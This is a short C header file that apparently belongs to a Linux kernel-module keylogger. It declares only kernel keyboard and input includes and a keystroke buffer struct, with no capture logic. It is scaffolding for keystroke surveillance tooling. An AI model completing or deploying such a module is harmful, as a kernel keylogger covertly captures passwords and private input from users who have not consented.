#ifndef	LKM_KEYLOG_H
#define LKM_KEYLOG_H

#include <linux/init.h>
#include <linux/input.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/kthread.h>
#include <linux/keyboard.h>
#include <linux/delay.h>

#include <linux/interrupt.h>
#include <asm/io.h>

typedef struct lkm_keylog_buf {
	char *buf;
	int  size;
	int  cnt;
	char *data;
}keylog_buf;

#endif
